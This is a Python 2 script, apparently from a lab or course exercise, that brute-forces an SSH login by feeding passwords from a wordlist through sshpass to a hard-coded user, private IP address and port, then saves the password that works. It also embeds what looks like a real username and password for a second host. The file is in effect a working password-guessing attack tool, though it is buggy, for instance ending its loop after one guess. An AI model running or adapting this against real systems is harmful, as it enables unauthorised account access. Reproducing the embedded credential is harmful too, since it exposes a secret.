#!/usr/bin/env python

# coding=utf-8

import subprocess
import threading
import commands
import time
from subprocess import PIPE, Popen

p = 1
USERNAME = "sigurdkb"
IP_ADRESS = "172.16.0.30"
PORT = "2222"
new_results = []
correct_pw = ""
cracked = bool(False)
filenr = 1
counter = 0

def connect_ssh():
        global correct_pw
        global cracked

        while cracked == False:
            pw = get_next_pw()
            cracked = True
            result = commands.getoutput("sshpass -p "+pw+" ssh "+USERNAME+"@"+IP_ADRESS+" -p "+PORT)

            if str(result).__contains__("Permission denied"):
                print "Password try: " + pw
            elif result.__contains__("Welcome") & result.__contains__("Ubuntu"):
                print "Correct password: " + pw
                correct_pw = pw
                f = open("correct_pw.txt", 'w')
                f.write(correct_pw)
                cracked = True
                exit(0)

            else:
                print "Passord som gav nytt resultat: " + pw
                print " Output: " + result
                new_results.append(pw)
                print new_results





def get_next_pw():
    global counter
    global counter_loop
    f = open("wordlist.txt", "r")

    line = f.readlines()[counter]
    counter += 1

    return line.strip('\n')


def main():
    # Just two threads for now, easy to activate additional threads: just initialize, start and join threads.
    t1 = threading.Thread(target=connect_ssh)
    t2 = threading.Thread(target=connect_ssh)

    t1.start()
    t2.start()

    t1.join()
    t2.join()



def subps():
    pw = get_next_pw()
    cmd = 'sshpass -p bkdrugis ssh Sigurdkb@10.225.147.156 -p 2222'.format(pw)

    output, err = Popen(cmd.split(), stdout=PIPE, stderr=PIPE).communicate()
    print "Output" + output, err

    if not b"Permission denied, please try again." in output:
        print "Det gikk: " + pw

    else:
        print "Feil passord: " + pw

# Optional function to split wordlist into multiple wordlists.
def split_file():
    global counter
    global filenr

    f = open("worlist_part"+str(filenr)+".txt", 'r')
    l = f.readlines()[counter]
    if l == '':
        print ("wordlist_part"+ str(filenr) + " er ferdig")
        filenr += 1
        split_file()
    else:
        counter += 1
        return l.strip('\n')

main()

